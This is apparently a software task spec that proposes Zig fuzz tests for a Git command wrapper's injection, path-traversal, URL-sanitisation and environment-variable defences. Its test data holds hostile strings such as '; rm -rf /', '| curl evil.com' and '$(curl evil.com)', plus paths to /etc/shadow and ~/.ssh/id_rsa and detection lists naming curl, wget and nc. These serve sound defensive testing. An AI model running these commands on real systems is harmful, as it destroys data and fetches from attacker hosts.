# Add Git Command Fuzz Tests

## Priority: Medium

## Problem
The Git command execution system in `src/git/command.zig` handles user input and constructs shell commands, making it a critical security boundary. Currently there are no fuzz tests to validate command injection prevention and argument sanitization.

## Current Security-Critical Areas
Based on code analysis:
- Command argument validation and sanitization
- Repository path validation  
- Git URL parsing and credential stripping
- Environment variable handling
- Shell command construction

## Expected Implementation

### 1. Create Git Command Fuzz Infrastructure
```zig
// tests/fuzz/git_command_fuzz.zig
const std = @import("std");
const testing = std.testing;
const git_command = @import("../../src/git/command.zig");

pub const GitFuzzResult = enum {
    safe_rejection,    // Input was safely rejected
    safe_execution,    // Input was safely executed  
    potential_injection, // Possible command injection
    crash,            // Parser crashed
    hang,             // Operation hung
};

pub const GitFuzzStats = struct {
    total_inputs: u32 = 0,
    safe_rejections: u32 = 0,
    safe_executions: u32 = 0,
    potential_injections: u32 = 0,
    crashes: u32 = 0,
    hangs: u32 = 0,
};

pub fn fuzzGitCommand(
    allocator: std.mem.Allocator,
    git_args: []const []const u8,
    repo_path: ?[]const u8,
    expected_safe: bool,
) GitFuzzResult {
    // Set up timeout to catch hangs
    var timer = std.time.Timer.start() catch return .crash;
    const timeout_ns = 2 * std.time.ns_per_s; // 2 seconds
    
    // Test argument validation first
    for (git_args) |arg| {
        if (!git_command.isSafeArgumentValue(arg)) {
            return .safe_rejection;
        }
        
        if (git_command.isBrokenGitArgument(arg)) {
            return .safe_rejection;
        }
    }
    
    // Test repository path validation if provided
    if (repo_path) |path| {
        git_command.validateRepositoryPath(path) catch {
            return .safe_rejection;
        };
        
        // Check for potential path traversal that got through
        if (std.mem.indexOf(u8, path, "..") != null or
            std.mem.indexOf(u8, path, "/etc") != null or
            std.mem.indexOf(u8, path, "/usr") != null or
            std.mem.indexOf(u8, path, "/var") != null) {
            if (expected_safe) {
                return .potential_injection;
            }
        }
    }
    
    // Test command construction without execution
    const git_exe = git_command.findGitExecutable(allocator) catch {
        return .safe_rejection;
    };
    defer allocator.free(git_exe);
    
    // Simulate command building
    var cmd_args = std.ArrayList([]const u8).init(allocator);
    defer cmd_args.deinit();
    
    cmd_args.append(git_exe) catch return .crash;
    for (git_args) |arg| {
        cmd_args.append(arg) catch return .crash;
    }
    
    if (timer.read() > timeout_ns) return .hang;
    
    // Check final command for injection patterns
    const full_command = std.mem.join(allocator, " ", cmd_args.items) catch return .crash;
    defer allocator.free(full_command);
    
    // Detect potential injection attempts that got through
    const injection_patterns = [_][]const u8{
        ";", "|", "&", "$", "`", "$(", "${", 
        "rm ", "curl ", "wget ", "nc ", "sh ",
        "/bin/", "/usr/bin/", "/etc/",
        "../", "./", "~/",
    };
    
    for (injection_patterns) |pattern| {
        if (std.mem.indexOf(u8, full_command, pattern) != null) {
            if (expected_safe) {
                std.log.warn("Potential injection in command: {s}", .{full_command});
                return .potential_injection;
            }
        }
    }
    
    return .safe_execution;
}
```

### 2. Argument Validation Fuzz Tests
```zig
test "fuzz git argument validation" {
    const allocator = testing.allocator;
    
    const fuzz_args = [_][]const u8{
        // Valid arguments
        "status",
        "log",
        "--oneline",
        "--format=short",
        "main",
        "origin/main",
        "HEAD~1",
        
        // Command injection attempts
        "; rm -rf /",
        "| curl evil.com",
        "&& malicious_command",
        "$(evil_command)",
        "`evil_command`",
        "${EVIL_VAR}",
        
        // Argument confusion
        "-rf",
        "--exec=rm -rf /",
        "--upload-archive",
        "--output=/etc/passwd",
        
        // Path traversal in arguments
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "/etc/passwd",
        "~/.ssh/id_rsa",
        
        // Unicode and encoding attacks
        "\u002e\u002e\u002f", // ../
        "%2e%2e%2f", // URL encoded ../
        "\x2e\x2e\x2f", // Hex encoded ../
        
        // Very long arguments
        "A" ** 10000,
        "-" ** 1000,
        
        // Binary data
        "\x00\x01\x02\x03",
        "\xFF\xFE\xFD\xFC",
        
        // Shell metacharacters
        "arg;",
        "arg|cmd",
        "arg&cmd",
        "arg>file",
        "arg<file",
        "arg*glob",
        "arg?glob",
        "arg[glob]",
        "arg{a,b}",
        
        // Environment variable injection
        "$HOME",
        "$PATH",
        "$USER",
        "$(whoami)",
        "${PATH}",
        
        // Newline injection
        "arg\nmalicious",
        "arg\rmalicious",
        "arg\tmalicious",
    };
    
    var stats = GitFuzzStats{};
    
    for (fuzz_args) |arg| {
        stats.total_inputs += 1;
        
        const args = [_][]const u8{arg};
        const result = fuzzGitCommand(allocator, &args, null, false);
        
        switch (result) {
            .safe_rejection => stats.safe_rejections += 1,
            .safe_execution => stats.safe_executions += 1,
            .potential_injection => {
                stats.potential_injections += 1;
                std.log.err("SECURITY: Potential injection with arg: {s}", .{arg});
            },
            .crash => {
                stats.crashes += 1;
                std.log.err("CRASH: Git command fuzzing crashed on arg: {s}", .{arg});
            },
            .hang => {
                stats.hangs += 1;
                std.log.err("HANG: Git command fuzzing hung on arg: {s}", .{arg});
            },
        }
    }
    
    std.log.info("Git argument fuzz results: {} total, {} rejected, {} safe, {} injections, {} crashes, {} hangs",
        .{ stats.total_inputs, stats.safe_rejections, stats.safe_executions, 
           stats.potential_injections, stats.crashes, stats.hangs });
    
    // Should have no injections, crashes, or hangs
    try testing.expectEqual(@as(u32, 0), stats.potential_injections);
    try testing.expectEqual(@as(u32, 0), stats.crashes);
    try testing.expectEqual(@as(u32, 0), stats.hangs);
}

test "fuzz git multi-argument combinations" {
    const allocator = testing.allocator;
    
    const arg_combinations = [_][]const []const u8{
        // Normal git commands
        &.{ "log", "--oneline" },
        &.{ "show", "HEAD" },
        &.{ "diff", "main..HEAD" },
        
        // Mixed safe/unsafe
        &.{ "log", "; rm -rf /" },
        &.{ "--oneline", "| curl evil.com" },
        &.{ "main", "&& malicious" },
        
        // Multiple injection attempts
        &.{ "; evil1", "| evil2", "& evil3" },
        &.{ "$(cmd1)", "$(cmd2)", "$(cmd3)" },
        &.{ "../..", "../../../etc", "/etc/passwd" },
        
        // Argument order confusion
        &.{ "-rf", "status" },
        &.{ "--exec=evil", "log" },
        &.{ "--output=/tmp/evil", "diff" },
        
        // Very long argument lists
        &(.{"arg"} ** 100),
        &(.{"--flag"} ** 50),
    };
    
    for (arg_combinations) |args| {
        const result = fuzzGitCommand(allocator, args, null, false);
        
        switch (result) {
            .potential_injection => {
                std.log.err("SECURITY: Injection in multi-arg: {any}", .{args});
                try testing.expect(false);
            },
            .crash => {
                std.log.err("CRASH: Multi-arg fuzzing crashed: {any}", .{args});
                try testing.expect(false);
            },
            .hang => {
                std.log.err("HANG: Multi-arg fuzzing hung: {any}", .{args});
                try testing.expect(false);
            },
            else => {}, // Safe results are OK
        }
    }
}
```

### 3. Repository Path Fuzz Tests
```zig
test "fuzz repository path validation" {
    const allocator = testing.allocator;
    
    const fuzz_paths = [_][]const u8{
        // Valid repository paths
        "repos/user/project.git",
        "user/project",
        "project.git",
        "my-project",
        "user123/repo-name_test",
        
        // Path traversal attempts
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "repos/../../../etc/passwd",
        "user/../../etc/shadow",
        "project/../../../../../bin/sh",
        
        // Absolute path attempts
        "/etc/passwd",
        "/usr/bin/sh",
        "/var/log/auth.log",
        "/home/user/.ssh/id_rsa",
        "/root/.bashrc",
        "C:\\Windows\\System32",
        "\\\\server\\share",
        
        // Special device files
        "/dev/null",
        "/dev/zero",
        "/proc/self/environ",
        "/proc/version",
        
        // URL-like paths
        "http://evil.com/repo",
        "https://github.com/user/repo.git",
        "git://server/repo",
        "ssh://user@host/repo",
        "file:///etc/passwd",
        
        // Encoded traversal
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "\u002e\u002e\u002f\u002e\u002e\u002f",
        
        // Very long paths
        "A" ** 2000, // Over Git's 1024 limit
        ("long-directory-name/" ** 100) ++ "repo",
        
        // Binary and control characters
        "\x00\x01\x02repo",
        "repo\x00\x01\x02",
        "repo\n\r\t",
        
        // Shell metacharacters
        "repo; rm -rf /",
        "repo | curl evil.com",
        "repo && malicious",
        "repo > /etc/passwd",
        "repo < /etc/passwd",
        "repo$(whoami)",
        "repo`id`",
        "repo${HOME}",
        
        // Case variations
        "../ETC/PASSWD",
        "..\\ETC\\PASSWD",
        "/ETC/PASSWD",
        
        // Symlink-like patterns
        "repos/user/../../etc",
        "repos/./../../etc",
        
        // Empty and edge cases
        "",
        ".",
        "..",
        "/",
        "\\",
        "~",
        "~/",
        
        // Unicode edge cases
        "репо/пользователь", // Cyrillic
        "リポジトリ/ユーザー", // Japanese
        "🔒/🔑", // Emoji
        "\uFEFF", // BOM
    };
    
    for (fuzz_paths) |path| {
        const result = git_command.validateRepositoryPath(path);
        
        // Categorize results
        const is_obviously_dangerous = blk: {
            const dangerous_patterns = [_][]const u8{
                "../", "..\\", "/etc/", "/usr/", "/var/", "/dev/", "/proc/",
                "C:\\", "\\\\", ";", "|", "&", "$", "`", "\x00",
            };
            
            for (dangerous_patterns) |pattern| {
                if (std.mem.indexOf(u8, path, pattern) != null) {
                    break :blk true;
                }
            }
            break :blk false;
        };
        
        if (result) |_| {
            // Path was accepted
            if (is_obviously_dangerous) {
                std.log.err("SECURITY: Dangerous path accepted: {s}", .{path});
                try testing.expect(false);
            }
        } else |err| {
            // Path was rejected - this is usually good
            switch (err) {
                error.InvalidRepository => {
                    // Expected for dangerous paths
                    if (!is_obviously_dangerous and path.len > 0 and path.len < 1000) {
                        // Might be overly restrictive, but better safe than sorry
                    }
                },
                else => {
                    std.log.err("Unexpected path validation error: {} for path: {s}", .{ err, path });
                    try testing.expect(false);
                },
            }
        }
    }
}

test "fuzz git URL sanitization" {
    const allocator = testing.allocator;
    
    const fuzz_urls = [_][]const u8{
        // Valid URLs
        "https://github.com/user/repo.git",
        "git@github.com:user/repo.git",
        "https://gitlab.com/user/repo.git",
        
        // URLs with credentials (should be stripped)
        "https://user:pass@github.com/repo.git",
        "https://token:x-oauth-basic@github.com/repo.git",
        "https://username:password123@gitlab.com/repo.git",
        
        // Credential injection attempts
        "https://user:pass@evil.com@github.com/repo.git",
        "https://user:pass%40evil.com@github.com/repo.git",
        "https://user@evil.com:pass@github.com/repo.git",
        
        // Command injection in URLs
        "https://user:; rm -rf /@github.com/repo.git",
        "https://user:$(curl evil.com)@github.com/repo.git",
        "https://user:`id`@github.com/repo.git",
        
        // Protocol confusion
        "file:///etc/passwd",
        "ftp://user:pass@ftp.example.com/repo",
        "ldap://ldap.example.com/",
        "javascript:alert('xss')",
        
        // Encoded URLs
        "https://user%3Apass@github.com/repo.git",
        "https://user:pass%40github.com/repo.git",
        "https://github.com%2Fuser%2Frepo.git",
        
        // Very long URLs
        "https://" ++ "A" ** 2000 ++ "@github.com/repo.git",
        "https://user:" ++ "B" ** 2000 ++ "@github.com/repo.git",
        
        // Binary data in URLs
        "https://\x00\x01\x02@github.com/repo.git",
        "https://user:\xFF\xFE\xFD@github.com/repo.git",
        
        // Unicode in URLs
        "https://üser:päss@github.com/repo.git",
        "https://user:🔑@github.com/repo.git",
    };
    
    for (fuzz_urls) |url| {
        const sanitized = git_command.sanitizeGitUrl(allocator, url) catch |err| {
            // URL sanitization failed - should not crash
            switch (err) {
                error.OutOfMemory => continue, // Expected for very long URLs
                else => {
                    std.log.err("Unexpected URL sanitization error: {} for URL: {s}", .{ err, url[0..@min(url.len, 50)] });
                    try testing.expect(false);
                },
            }
        };
        defer allocator.free(sanitized);
        
        // Check that credentials were removed
        try testing.expect(std.mem.indexOf(u8, sanitized, ":pass") == null);
        try testing.expect(std.mem.indexOf(u8, sanitized, ":password") == null);
        try testing.expect(std.mem.indexOf(u8, sanitized, ":token") == null);
        
        // Check that injection attempts were neutralized
        try testing.expect(std.mem.indexOf(u8, sanitized, "; rm") == null);
        try testing.expect(std.mem.indexOf(u8, sanitized, "$(") == null);
        try testing.expect(std.mem.indexOf(u8, sanitized, "`") == null);
        
        // Should not contain dangerous protocols if they were in original
        if (std.mem.startsWith(u8, url, "file://") or 
            std.mem.startsWith(u8, url, "javascript:") or
            std.mem.startsWith(u8, url, "ldap://")) {
            // These should either be rejected or heavily sanitized
            try testing.expect(!std.mem.startsWith(u8, sanitized, "file://"));
            try testing.expect(!std.mem.startsWith(u8, sanitized, "javascript:"));
            try testing.expect(!std.mem.startsWith(u8, sanitized, "ldap://"));
        }
    }
}
```

### 4. Environment Variable Fuzz Tests
```zig
test "fuzz git environment handling" {
    const allocator = testing.allocator;
    
    const fuzz_env_vars = [_]struct { name: []const u8, value: []const u8 }{
        // Valid environment variables
        .{ .name = "GIT_DIR", .value = "/path/to/repo/.git" },
        .{ .name = "GIT_WORK_TREE", .value = "/path/to/repo" },
        .{ .name = "HOME", .value = "/home/user" },
        
        // Injection attempts through env vars
        .{ .name = "GIT_DIR", .value = "/repo; rm -rf /" },
        .{ .name = "PATH", .value = "/tmp:$(curl evil.com)" },
        .{ .name = "HOME", .value = "`malicious`" },
        
        // Path traversal through env vars
        .{ .name = "GIT_DIR", .value = "../../../etc" },
        .{ .name = "GIT_WORK_TREE", .value = "/etc/passwd" },
        
        // Very long environment variables
        .{ .name = "GIT_DIR", .value = "A" ** 10000 },
        .{ .name = "VERY_LONG_NAME" ** 100, .value = "test" },
        
        // Binary data in env vars
        .{ .name = "GIT_DIR", .value = "\x00\x01\x02\x03" },
        .{ .name = "PATH", .value = "/bin:\xFF\xFE\xFD" },
        
        // Unicode in env vars
        .{ .name = "GIT_DIR", .value = "/🔒/🔑" },
        .{ .name = "测试", .value = "值" },
        
        // Shell metacharacters
        .{ .name = "GIT_DIR", .value = "/repo|curl evil.com" },
        .{ .name = "PATH", .value = "/bin&malicious" },
        
        // Control characters
        .{ .name = "GIT_DIR", .value = "/repo\n/etc/passwd" },
        .{ .name = "PATH", .value = "/bin\r\n/tmp" },
    };
    
    for (fuzz_env_vars) |env_var| {
        // Test environment variable validation
        const is_safe_name = blk: {
            for (env_var.name) |c| {
                if (!std.ascii.isAlphanumeric(c) and c != '_') {
                    break :blk false;
                }
            }
            break :blk true;
        };
        
        const is_safe_value = blk: {
            const dangerous_patterns = [_][]const u8{
                ";", "|", "&", "$", "`", "$(", "${", 
                "../", "/etc/", "/usr/", "/var/",
                "\x00", "\n", "\r",
            };
            
            for (dangerous_patterns) |pattern| {
                if (std.mem.indexOf(u8, env_var.value, pattern) != null) {
                    break :blk false;
                }
            }
            break :blk true;
        };
        
        // Environment variables should be validated before use
        if (!is_safe_name) {
            std.log.warn("Unsafe env var name would be rejected: {s}", .{env_var.name[0..@min(env_var.name.len, 50)]});
        }
        
        if (!is_safe_value) {
            std.log.warn("Unsafe env var value would be rejected: {s}={s}", 
                .{ env_var.name[0..@min(env_var.name.len, 20)], env_var.value[0..@min(env_var.value.len, 50)] });
        }
        
        // Test that dangerous combinations are detected
        if (!is_safe_name or !is_safe_value) {
            // These should be rejected by the Git command system
            continue;
        }
    }
}
```

### 5. Integration with Build System
```zig
// Add to build.zig
const git_fuzz_tests = b.addTest(.{
    .root_source_file = b.path("tests/fuzz/git_command_fuzz.zig"),
    .target = target,
    .optimize = optimize,
});

git_fuzz_tests.root_module.addImport("git_command", git_command_module);

const run_git_fuzz = b.addRunArtifact(git_fuzz_tests);
const git_fuzz_step = b.step("fuzz-git", "Run Git command fuzz tests");
git_fuzz_step.dependOn(&run_git_fuzz.step);
```

## Files to Create
- `tests/fuzz/git_command_fuzz.zig` (main Git command fuzzing)
- `tests/fuzz/git_protocol_fuzz.zig` (Git protocol fuzzing)

## Files to Modify
- `build.zig` (add Git fuzz test targets)
- `src/git/command.zig` (may need to export validation functions for testing)

## Benefits
- Discover command injection vulnerabilities
- Validate path traversal protection
- Test URL sanitization effectiveness  
- Find edge cases in argument parsing
- Ensure environment variable handling is secure
- Catch denial of service conditions (hangs, memory exhaustion)

## Testing Strategy
1. **Structured fuzzing** with known attack patterns
2. **Mutation-based fuzzing** for discovering unknown edge cases
3. **Coverage-guided fuzzing** to reach all code paths
4. **Performance testing** to catch DoS conditions
5. **Integration with CI** for continuous security testing

## Success Criteria
- No command injection possible through any input vector
- All path traversal attempts safely blocked
- URL sanitization removes all credentials and injection attempts
- No crashes or hangs under any input
- Environment variable handling prevents injection
- High code coverage of security-critical paths